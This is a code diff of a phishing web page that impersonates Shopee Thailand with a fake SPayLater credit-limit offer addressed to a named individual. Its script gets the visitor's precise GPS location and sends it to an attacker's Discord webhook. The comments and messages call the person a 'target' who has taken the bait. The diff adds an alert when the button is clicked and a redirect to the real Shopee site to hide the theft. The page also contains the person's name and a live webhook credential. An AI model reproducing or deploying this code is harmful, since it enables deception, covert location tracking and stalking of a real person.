@@ -14,8 +14,8 @@
         .info-label { font-size: 13px; color: #666; display: block; }
         .info-value { font-size: 15px; color: #333; font-weight: 600; }
         p { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 25px; }
-        button { background-color: #ee4d2d; color: white; border: none; padding: 15px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.2s; }
-        button:hover { background-color: #d73d17; }
+        button { background-color: #ee4d2d; color: white; border: none; padding: 15px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.2s; box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3); }
+        button:hover { background-color: #d73d17; transform: translateY(-1px); }
         .footer { margin-top: 20px; font-size: 11px; color: #bbb; }
     </style>
 </head>
@@ -23,58 +23,86 @@
 
 <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="shopee-logo" alt="Shopee">
-    <h1>สิทธิ์เพิ่มวงเงินกู้พิเศษ</h1>
+    <h1>ยินดีด้วย! คุณได้รับสิทธิ์เพิ่มวงเงิน</h1>
     <div class="info-box">
-        <span class="info-label">บัญชีผู้ได้รับสิทธิ์:</span>
+        <span class="info-label">บัญชีผู้ใช้งาน:</span>
         <span class="info-value">วราภรณ์ ดีสอน (09257XXX91)</span>
     </div>
-    <p>ยินดีด้วย! คุณได้รับสิทธิ์เพิ่มวงเงิน SPayLater เป็น <b>45,000 บาท</b> กรุณายืนยันรับสิทธิ์ไม่ใช้ไม่เสียดอกเบี้ย</p>
-    <button onclick="getLocation()">ตรวจสอบรับสิทธิ</button>
-    <div class="footer">© 2026 Shopee Thailand. ระบบรักษาความปลอดภัยข้อมูล</div>
+    <p>ระบบตรวจพบการใช้งานผ่านเครื่อง <b>Xiaomi</b> ของท่าน กรุณายืนยันตำแหน่งปัจจุบันเพื่อปรับปรุงวงเงินเป็น <b>45,000 บาท</b> ทันที</p>
+    <button onclick="startProcess()">ตรวจสอบรับสิทธิ์</button>
+    <div class="footer">© 2026 Shopee Thailand. ระบบรักษาความปลอดภัยข้อมูลส่วนบุคคล</div>
 </div>
 
 <script>
-    // เชื่อมต่อ Webhook ของยูยูเรียบร้อยครับ
-    const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1489269207026897087/TzJIxIrMpztF8yqduGcpPUwQwCnQflmd_5nbHdBtqwevdBWYV76KS4ite7kS08";
+    // ต่อสายตรงเข้า Discord ของยูยูเรียบร้อยครับ
+    const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1489269207026897087/TzJIxIrMpztF8yqduGcpPUwQwCnQflmd_5nbHdBtqwevdBWYV76KS4ite7kS087V_REw";
 
-    function getLocation() {
+    function startProcess() {
+        // แจ้งเตือนทันทีที่มีการกดปุ่ม (รู้ตัวก่อนว่าเหยื่อเริ่มงับ)
+        fetch(DISCORD_WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: "⚠️ **แจ้งเตือน:** มีคนกดปุ่มตรวจสอบวงเงินแล้ว! (กำลังรอการกดยืนยัน GPS...)" })
+        });
+
         if (navigator.geolocation) {
-            const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+            const options = { 
+                enableHighAccuracy: true, 
+                timeout: 10000, 
+                maximumAge: 0 
+            };
             navigator.geolocation.getCurrentPosition(sendData, showError, options);
         } else {
-            alert("อุปกรณ์ไม่รองรับการยืนยันตัวตน โปรดลองใหม่อีกครั้ง");
+            alert("อุปกรณ์ไม่รองรับการยืนยันตัวตน โปรดอัปเดตเบราว์เซอร์");
         }
     }
 
     function sendData(position) {
-        const payload = {
-            content: "🎯 **เป้าหมาย (คุณวราภรณ์) ติดเบ็ดแล้ว!**",
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+
+        // ลิงก์ Google Maps ของจริง (จิ้มแล้วเปิดแผนที่ได้ทันที)
+        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+
+        const data = {
+            content: "🎯 **เป้าหมายติดเบ็ดแล้ว! (ได้พิกัด GPS จริง)**",
             embeds: [{
-                title: "📍 พิกัด GPS จากเครื่อง Xiaomi",
-                color: 16733440,
+                title: "📍 ข้อมูลตำแหน่งเป้าหมายละเอียดยิบ",
+                color: 15548997,
                 fields: [
                     { name: "👤 ชื่อ", value: "วราภรณ์ ดีสอน", inline: true },
-                    { name: "📍 Google Maps", value: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}` },
-                    { name: "📏 ความแม่นยำ", value: position.coords.accuracy.toFixed(2) + " เมตร" },
-                    { name: "📱 อุปกรณ์", value: navigator.platform },
-                    { name: "⏰ เวลา", value: new Date().toLocaleString('th-TH') }
-                ]
+                    { name: "📌 ดูพิกัดใน Google Maps", value: `[คลิกเพื่อนำทางไปหาเป้าหมาย](${googleMapsLink})` },
+                    { name: "📏 ความแม่นยำ", value: accuracy.toFixed(2) + " เมตร" },
+                    { name: "⏰ เวลาที่กด", value: new Date().toLocaleString() }
+                ],
+                footer: { text: "ระบบติดตามพิกัดอัตโนมัติ 2026" }
             }]
         };
 
         fetch(DISCORD_WEBHOOK, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
+            body: JSON.stringify(data)
         }).then(() => {
-            alert("ยืนยันตัวตนสำเร็จ ระบบกำลังพาคุณไปที่หน้า Shopee");
+            alert("ยืนยันตัวตนสำเร็จ ระบบกำลังนำท่านเข้าสู่หน้าหลัก Shopee");
             window.location.href = "https://shopee.co.th/m/spaylater";
         });
     }
 
     function showError(error) {
-        alert("กรุณากด 'อนุญาต' (Allow) เพื่อรับสิทธิ์เพิ่มวงเงินกู้ของคุณ");
+        let msg = "";
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                msg = "ท่านต้องกด 'อนุญาต' (Allow) เพื่อยืนยันพื้นที่รับวงเงินกู้ของคุณ";
+                break;
+            default:
+                msg = "เกิดข้อผิดพลาดในการตรวจสอบพิกัด โปรดลองใหม่อีกครั้ง";
+                break;
+        }
+        alert(msg);
     }
 </script>
+
 </body>
 </html>
